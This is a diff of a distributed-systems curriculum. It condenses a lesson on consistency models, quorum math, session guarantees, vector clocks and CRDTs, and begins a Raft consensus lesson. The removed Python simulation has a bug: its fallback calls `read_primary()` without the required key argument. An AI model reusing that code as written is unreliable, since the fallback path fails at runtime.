+  W=1, R=1   (1+1=2, NOT > 3)   FAST, eventually consistent
+      write →  [n1*] [n2 ] [n3 ]        only n1 has it
+      read  ←        [n2 ]              STALE. legal. by design.
+      latency: one node. survives 2 failures. AP-shaped.
+
+  W=2, R=2   (2+2=4 > 3)         STRONGLY consistent
+      write →  [n1*] [n2*] [n3 ]        2 acked
+      read  ←        [n2*] [n3 ]        n2 in both sets → fresh
+      latency: slower of two. survives 1 failure. CP-shaped.
+
+  W=3, R=1   fragile writes — ANY node down blocks writes
+  W=1, R=3   fragile reads — mirror image
+
+DURING A PARTITION with W=2, R=2 and a 2/1 split:
+  majority side (2): can still reach W=2 → keeps serving
+  minority side (1): cannot → unavailable
+  That is CP in practice: the minority side stops, it does not silently diverge.
 ```
 
-**PICTURE IT LIKE THIS**
+Same system, per query: `balance` at quorum, `views` at one. The engineering work is classifying **operations**, not branding the database.
 
-A group chat where each person's phone syncs on its own schedule. **Linearizability** is everyone in the same room hearing every word at the moment it is spoken: there is one shared reality and no possible disagreement about what was said, and the price is that everyone must be present and listening. **Causal consistency** is the guarantee that you will never see someone's answer before the question it answers, even though two unrelated remarks made simultaneously may reach different people in different orders. That is the only ordering anyone actually notices, which is why causal consistency feels correct while being far cheaper than the room.
-
-The session guarantees are all about your own experience of the conversation. **Read your own writes** is your own message always appearing in your own view immediately, which is why its violation is so jarring: you typed it, so its absence reads as a bug rather than as latency. **Monotonic reads** is the conversation never scrolling backwards, which is what happens when one refresh reaches a well-synced phone and the next reaches a lagging one. Neither guarantee says anything about what other people see, and that is precisely why they are cheap.
-
-**Eventual consistency** is the promise that if everyone stops talking, all the phones will agree on the transcript. That is a real and useful promise, and note what it does not promise: nothing about how long the silence must last, and nothing at all about what you see while people are still talking.
-
-Conflict resolution has an analogy that explains why CRDTs matter. Two people edit the same shared shopping list while offline: one adds milk, the other removes bread. Last-write-wins means whichever phone syncs second wins outright and the other person's change vanishes without trace, which is why "my item disappeared" is such a common complaint in badly built offline apps. Vector clocks mean the app detects that the two edits were genuinely concurrent and can ask. A CRDT means the list is designed so "add milk" and "remove bread" simply compose into the obviously correct result, in either order, with no question to ask and nothing lost.
-
-**Internal Working, the hierarchy and the anomaly each level forbids**
+**SESSION GUARANTEES — THE BUGS USERS ACTUALLY REPORT:**
 
 ```text
-STRONGEST                                       coordination cost
-    |
-  LINEARIZABLE          one copy, real-time order        highest
-    |   forbids: reading a value older than a completed write
-    |   cost: a quorum round trip on EVERY operation; minority
-    |         side unavailable during a partition
-    v
-  SEQUENTIAL            same order everywhere, not real-time
-    |   forbids: two nodes disagreeing on the order of events
-    |   allows: that order lagging behind wall-clock time
-    v
-  CAUSAL                related events ordered everywhere    moderate
-    |   forbids: a reply appearing before its message
-    |   allows: unrelated concurrent events in different orders
-    |   <-- often the right target: forbids what users NOTICE
-    v
-  SESSION GUARANTEES    scoped to one client                 cheap
-    |     read-your-writes   your edit is visible to you
-    |     monotonic reads    time never runs backwards for you
-    |     writes-follow-reads  your causal chain is preserved
-    |     monotonic writes   your writes apply in your order
-    v
-  EVENTUAL              replicas converge if writes stop     lowest
-        forbids: essentially nothing about the interim
-        allows: stale reads, out-of-order reads, going backwards
-        it is a LIVENESS property with no SAFETY property
-
-WEAKEST
-```
-
-**Internal Working, each anomaly as it actually occurs**
-
-```text
-SETUP: one primary, two replicas, replication lag 200 ms.
-
 READ-YOUR-OWN-WRITES VIOLATION
-   t=0    user PUTs name="Alice"  -> primary. 200 OK.
-   t=10ms user GETs profile       -> replica2 (lag 200 ms)
-                                  -> returns name="Bob"  (the old value)
-   The user sees their own edit vanish. This is the single most
-   reported "bug" in replicated systems and it is not a bug.
-   FIX: pin this user's reads to the primary for ~2x the lag window,
-        or attach a version token and have the replica wait for it.
+  user writes address="New" to primary
+  user immediately GETs from lagging replica → still "Old"
+  feels like the site "ate" their edit
+
+FIXES (pick one consciously):
+  • pin session reads to primary for a short window after write
+  • track last-write version; refuse replicas below that version
+  • write-through the cache on update (Phase 83) so the hot path
+    never depends on replica lag for that key
 
 MONOTONIC READS VIOLATION
-   t=0    write name="Alice"
-   t=50   GET -> replica1 (lag 20 ms)  -> "Alice"     fresh
-   t=60   GET -> replica2 (lag 400 ms) -> "Bob"       OLDER!
-   Time appeared to run backwards. Refreshing showed less recent
-   data than the previous load.
-   FIX: route a given session to the SAME replica consistently
-        (hash the session id -> replica), or track the highest
-        version the client has seen and never serve below it.
+  read1 sees version 5 from replica A
+  read2 sees version 3 from replica B  → time went backwards
 
-CAUSAL VIOLATION
-   Alice: "Has anyone seen my keys?"   -> replica A
-   Bob reads it, replies: "On the table" -> replica B
-   Carol, reading replica B, receives Bob's reply FIRST:
-        Bob:   "On the table"          <- reply to nothing
-        Alice: "Has anyone seen my keys?"
-   FIX: attach the causal dependency to the reply and have the
-        replica delay delivery until the dependency has arrived.
-
-CONCURRENT WRITE / LOST UPDATE
-   Alice on replica A: cart = {milk, eggs}     t=100
-   Bob   on replica B: cart = {milk, bread}    t=101
-   Last-write-wins on timestamp -> {milk, bread}. Alice's eggs are
-   gone, with no error and no record. And note the timestamps came
-   from two different machines' clocks, which is a second problem.
-   FIX: detect it (vector clocks) or make it impossible (CRDT).
+FIX: client high-water mark; only accept replicas ≥ mark
 ```
 
-**Internal Working, vector clocks versus CRDTs**
+**CONFLICTS UNDER AP WRITES:**
+
+If both sides of a partition accept writes to the same key, you need a merge story:
+
+- **Last-write-wins** — simple; can discard a warehouse adjustment the storefront never saw.
+- **Application merge** — business rules (e.g. stock = min of both sides, then reconcile).
+- **Version vectors** — detect concurrent updates instead of guessing causality from timestamps.
+
+Name the cost out loud. Timestamps lie under clock skew; “newest wins” is a product decision wearing a systems costume.
+
+**BOOKSTORE — PER-OPERATION CHOICES:**
 
 ```text
-VECTOR CLOCKS -- detect concurrency, then decide what to do
-
-  Each replica keeps a counter per node.
-      A writes:  cart={milk},        vc = {A:1, B:0}
-      A writes:  cart={milk,eggs},   vc = {A:2, B:0}
-      B (from vc {A:1,B:0}) writes:  cart={milk,bread}, vc = {A:1,B:1}
-
-  Compare {A:2,B:0} with {A:1,B:1}:
-      is every element of the first <= the second?  A:2 > A:1  no
-      is every element of the second <= the first?  B:1 > B:0  no
-      -> NEITHER dominates -> the writes are CONCURRENT
-
-  You now KNOW there is a conflict, which is strictly better than
-  silently picking one. Your options: surface both to the user
-  (Amazon's cart did this), merge with domain logic, or union them.
-  The cost: metadata grows with the number of nodes, and someone
-  must still decide the resolution.
-
-CRDT -- make conflict impossible by construction
-
-  Requirement: merge must be commutative, associative, idempotent.
-  Then order of delivery cannot matter, and neither can duplicates.
-
-  G-Counter (grow-only counter): a vector of per-node counts
-      A: {A:5, B:0}     B: {A:0, B:3}
-      merge = elementwise MAX -> {A:5, B:3}, value = 8
-      merge is commutative, associative, idempotent. Always converges.
-      To support decrement, keep TWO counters (a PN-Counter) and
-      subtract, because MAX cannot un-count.
-
-  OR-Set (observed-remove set): elements tagged with unique ids
-      add(milk)    -> {(milk, id1)}
-      add(bread)   -> {(bread, id2)}
-      remove(bread)-> tombstone id2
-      merge = union of adds, minus union of tombstones
-      Alice's {milk, eggs} and Bob's {milk, bread}-minus-bread
-      merge to exactly the right answer, in EITHER order, with
-      nothing lost. No conflict exists to resolve.
-
-  This is why collaborative editors work offline: the text itself
-  is a CRDT, so two people typing in the same paragraph merge
-  deterministically rather than producing a conflict dialogue.
-  The cost: only operations you can make commute are expressible,
-  and tombstones accumulate.
+Charge card / finalize order     → strong: W+R>N or primary reads
+Update "pages viewed" counter    → eventual is fine
+Creator clicks their new short link immediately
+  → read-your-own-writes: write-through cache on create (Phase 83)
+Catalog blurb edited by staff    → short stale window OK; invalidate cache
+Inventory under multi-warehouse  → decide CP vs AP with oversell cost (85.1)
 ```
 
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
+**WHAT THIS PHASE STILL DOES NOT OWN:**
 
-
-| Model                | Coordination per operation      | Latency                                | Available under partition | Anomalies permitted                   |
-| -------------------- | ------------------------------- | -------------------------------------- | ------------------------- | ------------------------------------- |
-| Linearizable         | quorum round trip               | highest, cross-region if replicated so | minority side stops       | none, for single objects              |
-| Sequential           | global order agreement          | high                                   | minority side stops       | reads may lag real time               |
-| Causal               | dependency tracking only        | moderate, no global coordination       | yes, both sides serve     | concurrent events ordered differently |
-| Read your own writes | per-session routing             | near zero                              | yes                       | others see stale data                 |
-| Monotonic reads      | sticky replica or version token | near zero                              | yes                       | others see stale data                 |
-| Eventual             | none                            | lowest                                 | yes                       | stale, out of order, backwards        |
-
-
-
-| Conflict handling                 | Data loss                                 | Metadata cost                            | Application burden                           |
-| --------------------------------- | ----------------------------------------- | ---------------------------------------- | -------------------------------------------- |
-| Last write wins, timestamps       | silent, and clock skew makes it arbitrary | none                                     | none, which is why it is chosen              |
-| Last write wins, node id tiebreak | silent but deterministic                  | none                                     | none                                         |
-| Vector clocks                     | none, conflicts are detected              | grows with node count                    | must resolve every detected conflict         |
-| CRDT                              | none, conflicts cannot occur              | tombstones and per-node state accumulate | operations must be expressible commutatively |
-| Single writer per key             | none, no concurrency exists               | none                                     | availability tied to that one writer         |
-
-
-The trade-off worth internalising is that the four session guarantees sit at an unusually good point on this curve. They cost almost nothing, they are implementable with a routing rule or a version token, and they eliminate the overwhelming majority of user-visible anomalies, because users notice their *own* data being wrong and rarely notice that someone else's view was two hundred milliseconds behind. Reaching for linearizability to fix a read-your-own-writes complaint is the classic overcorrection: it does solve the problem, and it charges you a cross-region round trip on every request forever to solve something a session token handles for free.
-
-**SMALL WORKING EXAMPLE**
+How replicas *agree* on a leader under failure is Phase 86 (consensus). How your *caller* survives a sick dependency with retries and breakers is Phase 87. Do not turn consistency models into a reliability-pattern catalog. Do not re-teach Phase 65’s runbooks for failover — bridge to them, do not duplicate the ops chapter.
 
 ```python
-# ===============================================================
-# 1. Reproduce each anomaly against a simulated replicated store,
-#    then fix it. Seeing them fire is what makes the models stick.
-# ===============================================================
-import time, threading, random
-from dataclasses import dataclass, field
+# Quorum overlap rule — mechanism, not a database.
+def is_strong(N, W, R):
+    return W + R > N
 
-@dataclass
-class Replica:
-    name: str
-    lag_ms: int
-    data: dict[str, tuple[str, int]] = field(default_factory=dict)
+print("W2R2 strong?", is_strong(3, 2, 2))
+print("W1R1 strong?", is_strong(3, 1, 1))
 
-class ReplicatedStore:
-    def __init__(self, lags=(20, 200, 400)):
-        self.version = 0
-        self.primary: dict[str, tuple[str, int]] = {}
-        self.replicas = [Replica(f"r{i+1}", lag) for i, lag in enumerate(lags)]
-
-    def write(self, key, value):
-        self.version += 1
-        v = self.version
-        self.primary[key] = (value, v)
-        for r in self.replicas:                    # async, with lag
-            threading.Timer(
-                r.lag_ms / 1000,
-                lambda rr=r: rr.data.__setitem__(key, (value, v)),
-            ).start()
-        return v
-
-    def read_primary(self, key):
-        return self.primary.get(key, (None, 0))
-
-    def read_any_replica(self, key):
-        r = random.choice(self.replicas)
-        return r.data.get(key, (None, 0)), r.name
-
-store = ReplicatedStore()
-store.write("name", "Bob")
-time.sleep(0.5)                                     # let replicas catch up
-
-print("=== READ-YOUR-OWN-WRITES VIOLATION ===")
-store.write("name", "Alice")                        # the user's own edit
-(value, ver), replica = store.read_any_replica("name")
-print(f"  user wrote 'Alice', then read {value!r} from {replica}")
-print("  the user sees their own edit vanish\n")
-
-print("=== MONOTONIC READS VIOLATION ===")
-time.sleep(0.05)
-observed = []
-for _ in range(6):
-    (v, ver), r = store.read_any_replica("name")
-    observed.append((r, v, ver))
-    time.sleep(0.02)
-for r, v, ver in observed:
-    print(f"  {r}: {v!r} (v{ver})")
-went_backwards = any(observed[i][2] > observed[i+1][2] for i in range(len(observed)-1))
-print(f"  version went BACKWARDS across reads: {went_backwards}\n")
-
-# --- FIX 1: read-your-own-writes via session pinning -----------
-class SessionAwareStore(ReplicatedStore):
-    """The cheap fix that resolves the most common complaint."""
-    def __init__(self, *a, **kw):
-        super().__init__(*a, **kw)
-        self.last_write_version: dict[str, int] = {}
-        self.max_lag_s = max(r.lag_ms for r in self.replicas) / 1000 * 2
-
-    def write_as(self, session, key, value):
-        v = self.write(key, value)
-        self.last_write_version[session] = v
-        return v
-
-    def read_as(self, session, key):
-        want = self.last_write_version.get(session, 0)
-        if want:
-            # Option A: route to the primary while this session's write
-            # may not have propagated.
-            value, ver = self.read_primary(key)
-            if ver >= want:
-                return value, "primary (pinned)"
-        # Option B (also implemented): accept a replica only if it is
-        # already at or beyond the version this session has seen.
-        for r in self.replicas:
-            value, ver = r.data.get(key, (None, 0))
-            if ver >= want:
-                return value, r.name
-        return self.read_primary()[0], "primary (fallback)"
-
-s = SessionAwareStore()
-s.write("name", "Bob"); time.sleep(0.5)
-s.write_as("alice-session", "name", "Alice")
-print("=== FIXED: read-your-own-writes ===")
-print("  alice reads :", s.read_as("alice-session", "name"))
-print("  bob reads   :", s.read_as("bob-session", "name"),
-      " <- may be stale, and that is fine\n")
-
-# --- FIX 2: monotonic reads via a version token ---------------
-class MonotonicSession:
-    """Never serve a client data older than it has already seen."""
-    def __init__(self, store):
-        self.store = store
-        self.high_water = 0
-
-    def read(self, key):
-        for _ in range(20):
-            for r in self.store.replicas:
-                value, ver = r.data.get(key, (None, 0))
-                if ver >= self.high_water:
-                    self.high_water = ver
-                    return value, ver, r.name
-            time.sleep(0.02)
-        value, ver = self.store.read_primary(key)
-        self.high_water = ver
-        return value, ver, "primary"
-
-store2 = ReplicatedStore()
-store2.write("name", "Bob"); time.sleep(0.5); store2.write("name", "Alice")
-sess = MonotonicSession(store2)
-print("=== FIXED: monotonic reads ===")
-versions = [sess.read("name")[1] for _ in range(6)]
-print("  versions observed:", versions)
-print("  monotonically non-decreasing:",
-      all(versions[i] <= versions[i+1] for i in range(len(versions)-1)), "\n")
-
-# ===============================================================
-# 2. VECTOR CLOCKS -- detect concurrency instead of guessing
-# ===============================================================
-class VectorClock(dict):
-    def increment(self, node):
-        vc = VectorClock(self); vc[node] = vc.get(node, 0) + 1
-        return vc
-
-    def dominates(self, other):
-        return (all(other.get(k, 0) <= self.get(k, 0) for k in set(self) | set(other))
-                and self != other)
-
-    def concurrent_with(self, other):
-        return not self.dominates(other) and not other.dominates(self) and self != other
-
-a = VectorClock({"A": 1, "B": 0}).increment("A")      # {A:2, B:0}
-b = VectorClock({"A": 1, "B": 0}).increment("B")      # {A:1, B:1}
-print("=== VECTOR CLOCKS ===")
-print(f"  A's write {dict(a)}   B's write {dict(b)}")
-print(f"  A dominates B?  {a.dominates(b)}")
-print(f"  concurrent?     {a.concurrent_with(b)}  <- so a conflict EXISTS")
-print("  last-write-wins would silently discard one of them\n")
-
-# ===============================================================
-# 3. CRDTs -- make the conflict impossible instead
-# ===============================================================
-class GCounter:
-    """Grow-only counter. merge = elementwise max, which is
-    commutative, associative, and idempotent -> always converges."""
-    def __init__(self, node): self.node, self.counts = node, {}
-    def increment(self, n=1): self.counts[self.node] = self.counts.get(self.node, 0) + n
-    def value(self): return sum(self.counts.values())
-    def merge(self, other):
-        for k, v in other.counts.items():
-            self.counts[k] = max(self.counts.get(k, 0), v)
-
-class ORSet:
-    """Observed-remove set. Adds carry unique tags; removes tombstone
-    the tags they observed. Union of adds minus union of removes."""
-    def __init__(self): self.adds, self.removes = set(), set()
-    def add(self, element):
-        self.adds.add((element, f"{id(self)}-{time.time_ns()}"))
-    def remove(self, element):
-        self.removes |= {t for t in self.adds if t[0] == element}
-    def value(self): return {e for (e, _) in self.adds - self.removes}
-    def merge(self, other):
-        self.adds |= other.adds
-        self.removes |= other.removes
-
-print("=== CRDT: counter converges regardless of merge order ===")
-c1, c2, c3 = GCounter("n1"), GCounter("n2"), GCounter("n3")
-for _ in range(5): c1.increment()
-for _ in range(3): c2.increment()
-for _ in range(7): c3.increment()
-import copy, itertools
-for order in itertools.permutations([c1, c2, c3]):
-    merged = GCounter("x")
-    for c in order: merged.merge(copy.deepcopy(c))
-    print(f"  merge order {[c.node for c in order]} -> {merged.value()}")
-print("  every order gives 15. Convergence is structural, not lucky.\n")
-
-print("=== CRDT: the shopping cart that loses nothing ===")
-alice, bob = ORSet(), ORSet()
-for item in ("milk", "bread"): alice.add(item); bob.add(item)
-alice.merge(bob); bob.merge(alice)
-alice.add("eggs")          # Alice, offline
-bob.remove("bread")        # Bob, offline, concurrently
-print(f"  alice offline: {alice.value()}")
-print(f"  bob offline:   {bob.value()}")
-alice.merge(bob); bob.merge(alice)
-print(f"  after merge:   alice={alice.value()}  bob={bob.value()}")
-print("  eggs kept, bread removed, nothing lost, no conflict to resolve")
+write_set, read_set = {"n1"}, {"n2"}
+print("eventual path overlap?", bool(write_set & read_set))  # False → stale legal
 ```
 
-```bash
-# Watch the anomaly against a real database rather than a simulation.
-# This is the exercise that makes replication lag concrete.
+**PRACTICE:**
 
-docker run -d --name pg-primary -e POSTGRES_PASSWORD=dev postgres:16 \
-  -c wal_level=replica -c max_wal_senders=4 -c hot_standby=on
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | Define eventual consistency vs linearizability in one sentence each |
+| Medium | Show W,R,N values that give strong reads and values that allow stale reads |
+| Medium | Explain read-your-own-writes for a customer who edits an address then reloads — and one fix |
+| Hard | For bookstore checkout vs view-counter vs short-link redirect, assign a consistency model and justify the cost |
 
-# Add artificial lag to the replica's link, because on localhost the
-# lag is too small to observe the bug you are trying to see:
-tc qdisc add dev eth0 root netem delay 300ms
+**WHAT THIS UNLOCKS NEXT:**
 
-# Then run: write to the primary, read from the replica immediately.
-psql -h primary -c "UPDATE users SET name='Alice' WHERE id=1"
-psql -h replica -c "SELECT name FROM users WHERE id=1"     # 'Bob'
-
-# Measure the lag you are actually subject to:
-psql -h primary -c "SELECT client_addr, replay_lag FROM pg_stat_replication"
-
-# And the fix, expressed in Postgres's own terms:
-psql -h replica -c "SET synchronous_commit = on"   # or route this
-                                                  # session to the primary
-```
-
-**HOW TO EXPLAIN THIS IN AN INTERVIEW:** naming the *specific* consistency model a system needs (not just "eventual consistency" as a catch-all) is what separates a system design answer that sounds right from one that's actually been reasoned through. The question that most reliably comes up is "a user edits their profile and sees the old value after reloading, what happened and how do you fix it," where the expected answer identifies replication lag, names read-your-own-writes as the guarantee being violated, and offers session pinning or a version token rather than jumping to strong consistency. Expect "what is the difference between eventual and strong consistency," where a strong answer notes that eventual consistency is a liveness property with no safety property attached. Expect "how do you resolve two concurrent writes to the same key," where last-write-wins should be named along with its silent data loss, and vector clocks or CRDTs offered as the alternatives with their costs. Causal consistency is a good thing to raise unprompted, because forbidding a reply from preceding its message is exactly the anomaly users notice and it is achievable without global coordination. If CRDTs come up, being able to state the three algebraic properties that make merging safe, commutativity, associativity, and idempotence, is what shows you understand why they work rather than that they exist.
-
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
-
-| Difficulty | Task                                                                                                                                                                                                |
-| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | List the consistency models from strongest to weakest and name the one anomaly each level forbids                                                                                                   |
-| Easy       | Explain read-your-own-writes and monotonic reads, and give a user-visible symptom of each being violated                                                                                            |
-| Easy       | Explain in two sentences why eventual consistency is not a safety guarantee                                                                                                                         |
-| Easy       | Run the code above and report which anomalies fired on your machine                                                                                                                                 |
-| Easy       | Classify five operations from an application you use by the weakest consistency model that would still be correct                                                                                   |
-| Medium     | Compare two vector clocks by hand and determine whether they are ordered or concurrent, showing your working                                                                                        |
-| Medium     | Implement session pinning for read-your-own-writes against a real primary and replica pair, and prove the bug is gone                                                                               |
-| Medium     | Implement monotonic reads with a version token and demonstrate that versions never decrease across a session                                                                                        |
-| Medium     | Set up Postgres with a replica, add 300 ms of artificial lag, and reproduce the read-your-own-writes bug against real SQL                                                                           |
-| Medium     | Implement a PN-Counter that supports decrement, and explain why a single grow-only counter cannot                                                                                                   |
-| Medium     | Demonstrate a lost update with last-write-wins, then prevent it with an OR-Set and show the difference in outcome                                                                                   |
-| Medium     | Read [Jepsen's consistency model map](https://jepsen.io/consistency) and write down three implications between models that surprised you                                                            |
-| Medium     | Measure the real replication lag of a database you have access to and state the staleness window your application is exposed to                                                                     |
-| Hard       | Complete [Fly.io's distributed systems challenge](https://fly.io/dist-sys/) through the grow-only counter and the broadcast problems                                                                |
-| Hard       | Implement causal consistency: attach dependencies to each write and have replicas delay delivery until dependencies arrive. Then demonstrate that a reply can no longer precede its message         |
-| Hard       | Implement an OR-Set with tombstone garbage collection, and explain precisely what you must know before a tombstone is safe to delete                                                                |
-| Hard       | Build a collaborative counter that works offline, syncs on reconnect, and loses nothing. Test it with three clients partitioned from each other                                                     |
-| Hard       | Take a real application feature and specify the consistency model for every one of its operations, justifying each choice against the cost table above                                              |
-| Hard       | Use [Maelstrom](https://github.com/jepsen-io/maelstrom) to test your own implementation and report which anomalies the checker found that you did not expect                                        |
-| Hard       | Read [Designing Data-Intensive Applications](https://dataintensive.net/) chapter 9, then explain the difference between linearizability and serializability and why the two are frequently confused |
-
-
-**WHY THE NEXT TOPIC IS NEEDED - Consensus:** Choosing a consistency model tells you what guarantee you *want*. It doesn't yet explain the actual mechanism multiple machines use to agree on a single value (like "who is the current primary database") when any one of them might crash mid-conversation.
+Consistency models describe what readers may see. They do not by themselves elect a new primary when the old one dies mid-write without risking split brain. Getting unreliable machines to **agree on one value** (who is leader; what is committed) is the consensus problem — Phase 86.
 
 ---
 
@@ -18472,482 +14586,191 @@ psql -h replica -c "SET synchronous_commit = on"   # or route this
 
 ---
 
-
-
 # PHASE 86 - Coordination & Consensus
 
 **Track:** System Design & Distributed Systems
 
-**WHAT YOU WILL BE ABLE TO DO:** Explain what a consensus algorithm (e.g. Raft) buys you - leader election and replicated log agreement - when machines can fail or lose contact. Distinct from Phase 87: consensus is *how replicas agree*; reliability patterns are *how a client survives a sick dependency*.
+**WHAT YOU WILL BE ABLE TO DO:** Explain what a consensus algorithm (Raft-level intuition) buys you — leader election and replicated log agreement — when machines can fail or lose contact. Distinct from Phase 87: consensus is *how replicas agree*; reliability patterns are *how a client survives a sick dependency*.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 85 (CAP is the problem statement consensus responds to), Phase 53 (agreement across threads foreshadows agreement across machines).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 85 — CAP is the problem statement consensus responds to. Phase 65 — “promote a replica” was named operationally; this phase asks *how the remaining nodes agree which one*. Phase 53 — agreement across threads foreshadows agreement across machines.
+
+**LEARNING RESOURCES:**
+
+- [The Secret Lives of Data — Raft visualized](http://thesecretlivesofdata.com/raft/) — click through first
+- [Raft Explained (ByteByteGo)](https://www.youtube.com/watch?v=IujMVjKvWP4)
+- [Raft paper (Ongaro & Ousterhout)](https://raft.github.io/raft.pdf) — unusually readable
+- [Raftscope](https://raft.github.io/) — pause nodes; watch elections
+- Optional depth: [MIT 6.5840](https://pdos.csail.mit.edu/6.824/) Raft lab overview page
 
 ## 86.1 Consensus & Fault Tolerance
 
-**WHY YOU ARE LEARNING THIS:** Phase 65/82 said "if the primary fails, a replica can be promoted" - but *how* do the remaining machines agree on exactly *which* replica becomes the new primary, especially if several machines can't currently talk to each other (Phase 85's partition) and any one of them might crash at any moment, mid-decision? Getting a group of unreliable machines to agree on a single value, even when some of them fail, is the consensus problem - and it is provably impossible to solve perfectly in an asynchronous network with even one faulty node (FLP), which is *why* real consensus algorithms make specific, careful trade-offs rather than claiming a perfect solution.
+Phase 65/82 said “if the primary fails, a replica can be promoted.” Phase 85 showed that during a partition, two sides can disagree. So *how* do the remaining machines agree on exactly *which* replica becomes primary — especially if several cannot talk, and any one may crash mid-decision? Getting unreliable machines to agree on a single value is the **consensus** problem. This phase owns Raft-level intuition: leader election, log replication, majority quorums, split-brain prevention. Not a Paxos research dump; not a caller-side retry catalog (87).
 
-**Role split:** **Phase 86** = agreement among replicas (Raft-level intuition; no Paxos implementation homework). **Phase 87** = timeouts, retries, circuit breakers on the *caller* side when a dependency is slow or down.
+**WHY CONSENSUS BECOMES NECESSARY NOW:**
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+Replication without agreement risks **split brain**: two nodes both believe they are primary, both accept writes, and the bookstore’s order ledger forks into two histories that cannot both be true. CAP told you the minority side must become unavailable under a CP choice. Consensus is the mechanism that *implements* that choice for leadership and committed history.
 
-- Best animated explanation: [The Raft Consensus Algorithm, visualised (The Secret Lives of Data)](http://thesecretlivesofdata.com/raft/) - this is a step-by-step animation you click through, and it is genuinely the best explanation of consensus that exists in any medium. Do this one first. Then [Raft Explained (ByteByteGo)](https://www.youtube.com/watch?v=IujMVjKvWP4) for the compressed version
-- Alternative: [Designing for Understandability: The Raft Consensus Algorithm (Diego Ongaro)](https://www.youtube.com/watch?v=vYp4LYbnnW8) is the author presenting his own paper, and the framing that Raft was designed to be *teachable* rather than merely correct explains why it displaced Paxos. Also [Raft Lecture (John Ousterhout, Stanford)](https://www.youtube.com/watch?v=YbZ3zDzDnrw) for the full treatment
-- Another angle: [Understand RAFT without breaking your brain](https://www.youtube.com/watch?v=IujMVjKvWP4) *(Composio YouTube; replaced dead Paxos ID)* shows a practical consensus algorithm and why it matters, [What is Byzantine Fault Tolerance (Binance Academy)](https://www.youtube.com/watch?v=VWG9xcwjxUg) *(Composio YouTube)* covers the harder failure model where nodes lie rather than merely crash, and [Designing for Understandability: The Raft Consensus Algorithm (Ousterhout)](https://www.youtube.com/watch?v=vYp4LYbnnW8) *(Composio YouTube)* covers how these systems are meant to be reasoned about in production
-- Interactive simulator: [Raftscope](https://raft.github.io/) is a live, running Raft cluster in your browser where you can stop nodes, partition the network, and watch elections happen in real time, and it is the single most valuable link in this section. [The Secret Lives of Data](http://thesecretlivesofdata.com/raft/) is the guided version of the same thing. Locally, run a three-node etcd cluster, `docker pause` the leader, and watch a new one get elected in the logs
-- Written documentation: [In Search of an Understandable Consensus Algorithm (the Raft paper)](https://raft.github.io/raft.pdf) is unusually readable for a systems paper and worth reading in full, [the Raft website's resource list](https://raft.github.io/) collects every implementation, [Paxos Made Simple (Lamport)](https://lamport.azurewebsites.net/pubs/paxos-simple.pdf) for the original, and [The FLP impossibility result explained](https://www.the-paper-trail.org/post/2008-08-13-a-brief-tour-of-flp-impossibility/) for why perfect consensus is provably unattainable
-- GitHub implementation: [etcd's Raft library](https://github.com/etcd-io/raft) is the most widely deployed implementation and is readable, [hashicorp/raft](https://github.com/hashicorp/raft) is smaller and a good first read, and [the Raft implementations list](https://raft.github.io/#implementations) has over a hundred in every language. For learning, [MIT 6.5840's lab 2](https://pdos.csail.mit.edu/6.824/labs/lab-raft.html) has you build one yourself against a real test suite
-- Practice platform: [MIT 6.5840](https://pdos.csail.mit.edu/6.824/) is the definitive course and its Raft lab is the most respected exercise in distributed systems. [Fly.io's distributed systems challenge](https://fly.io/dist-sys/) reaches consensus territory in its later problems, and [Jepsen's analyses](https://jepsen.io/analyses) show what happens when real implementations get it subtly wrong
+**WHAT CONSENSUS BUYS YOU:**
 
-**STEP-BY-STEP EXPLANATION**
+- A single decided value (or log entry) that a **majority** has accepted.
+- Leader election that remains safe under crash faults.
+- A replicated log so followers apply the same commands in the same order.
 
-Consensus is the problem of getting a group of unreliable machines to agree on a single value, and it is the foundation underneath almost every distributed system that claims strong guarantees. Leader election, distributed locks, cluster membership, and configuration management are all consensus in disguise, which is why solving it once and depending on it is the dominant pattern.
+What it costs: a round trip to a majority on the decision path; careful timeouts; you keep the consensus layer **small** (metadata / leadership / config), not every product page view.
 
-The starting point is a negative result. **FLP impossibility** proves that in a fully asynchronous network, where messages can be delayed arbitrarily, no deterministic algorithm can guarantee consensus if even one node may fail. The reason is that a node cannot distinguish a crashed peer from a slow one, so any algorithm must either risk waiting forever, sacrificing liveness, or risk deciding without a peer that was merely slow, sacrificing safety. Real algorithms escape this by adding a **partial synchrony** assumption in the form of timeouts: they preserve safety unconditionally and guarantee liveness only when the network is behaving. That is the specific trade-off, and it is why every consensus system has timeout parameters that are genuinely difficult to tune.
+**FLP — WHY TIMEOUTS EXIST:**
 
-**Raft** is the algorithm to learn, because it was explicitly designed to be understandable and it decomposes cleanly into three pieces. Every node is in one of three states: **follower**, **candidate**, or **leader**. Time is divided into **terms**, each with at most one leader, and the term number acts as a logical clock that lets nodes detect and reject stale information.
+In a fully asynchronous network, FLP impossibility says no deterministic algorithm can guarantee consensus if even one node may fail — because you cannot distinguish “crashed” from “slow.” Real systems add **partial synchrony** via timeouts: preserve **safety** always; guarantee **liveness** when the network behaves. That is why election timeouts are load-bearing configuration, not trivia.
 
-**Leader election** works like this. Followers expect regular heartbeats from the leader. If a randomised election timeout expires without one, a follower increments the term, becomes a candidate, and requests votes from everyone. A node grants its vote at most once per term, and only if the candidate's log is at least as up to date as its own. A candidate that collects votes from a majority becomes leader. The randomisation of the timeout is what prevents all followers from becoming candidates simultaneously and splitting the vote forever, and it is a small detail that makes the whole thing work.
+**RAFT IN THREE PIECES:**
 
-**Log replication** is the second piece. All client requests go to the leader, which appends the entry to its log and sends it to followers. Once a majority have stored the entry, the leader marks it **committed**, applies it to its state machine, and returns to the client. The critical safety property is that a leader never overwrites its own entries and never counts an entry from a previous term as committed on replica count alone, which closes a subtle hole where a committed entry could otherwise be lost during a leader change.
+Raft was designed to be understandable. Every node is **follower**, **candidate**, or **leader**. Time is divided into **terms**; at most one leader per term. Term numbers act as a logical clock so stale leaders get rejected.
 
-**Safety** is the third piece and rests on the majority-overlap argument. Any two majorities of the same set must share at least one member, so two conflicting decisions cannot both achieve a majority. This is why the quorum is a majority specifically rather than any arbitrary group, and it also explains why cluster sizes are odd. Five nodes tolerate two failures; six nodes also tolerate only two, since a majority of six is four, so the sixth node adds cost and latency without adding fault tolerance.
